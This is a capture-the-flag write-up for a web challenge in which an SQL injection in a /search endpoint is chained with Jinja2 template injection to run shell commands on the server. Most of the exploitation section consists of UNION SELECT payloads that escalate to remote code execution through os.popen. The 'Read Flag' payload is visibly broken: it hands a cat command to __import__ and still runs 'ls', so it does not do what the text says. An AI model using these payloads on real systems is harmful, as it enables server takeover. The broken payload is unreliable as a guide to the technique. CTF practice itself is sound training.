# PatriotCTF 2025 - Thought Vault
## Category: Web
### Author: iamncloud9

---

### Exploitation
- The /search endpoint contains an SQL injection vulnerability, combined with SSTI
```SQL
' UNION SELECT '{{7*7}}         #-> 49
' UNION SELECT '{{7*"7"}}       #-> 7777777
```

- The application uses Jinja2. From there, we can perform RCE (Remote Code Execution) to interact with the server:
  - Find Flag file:
    ```SQL
    ' UNION SELECT '{{ self.__init__.__globals__.__builtins__.__import__("os").popen("ls ../").read() }}
    ```
  - Read Flag:
    ```SQL
    ' UNION SELECT '{{ self.__init__.__globals__.__builtins__.__import__("cat ../flag-57ef80cf80669dd97734006bbe828e74.txt").popen("ls ../").read() }}
    ```
  - The Flag will be displayed on screen:
  <img width="1644" height="598" alt="image" src="https://github.com/user-attachments/assets/4fc7c377-8c9e-4663-8d99-cf1e8994a8b5" />

---

### Result
```
PCTF{SQL1_C4n_b3_U53D_3Ff1C13N7lY}
```
